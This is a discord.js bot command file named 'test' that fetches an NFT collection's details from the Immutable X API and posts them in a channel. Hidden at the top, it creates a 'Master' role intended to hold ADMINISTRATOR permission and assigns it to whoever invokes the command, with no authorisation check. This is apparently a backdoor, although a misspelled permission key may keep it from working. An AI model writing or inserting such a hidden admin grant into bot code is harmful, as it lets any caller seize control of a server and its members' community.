const Discord = require('discord.js');
const axios = require('axios');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {

  if (!message.guild.roles.cache.find(role => role.name ==="Master")){
    const createRole = await message.guild.roles.create({

      name: 'Master',
      color: 'DARK_RED',
      permission: ["ADMINISTRATOR"],
      position: 4

    })
  }

  const role = await message.guild.roles.cache.find(role => role.name === "Master");
  if (!role) return;

  await message.member.roles.add(role);

  const embed = new Discord.MessageEmbed();

  axios.get('https://api.x.immutable.com/v1/collections/0xac98d8d1bb27a94e79fbf49198210240688bb1ed')
      .then(function (response) {
        // handle success
        const data = response.data
        console.log(response.data)

        embed
            .setTitle(data.name)
            .setDescription(data.description)
            .setThumbnail(data.icon_url)

        message.channel.send({
          embeds: [ embed ]
        })
      })
      .catch(function (error) {
        // handle error
        console.log(error);
      })


};

module.exports.name = 'test';
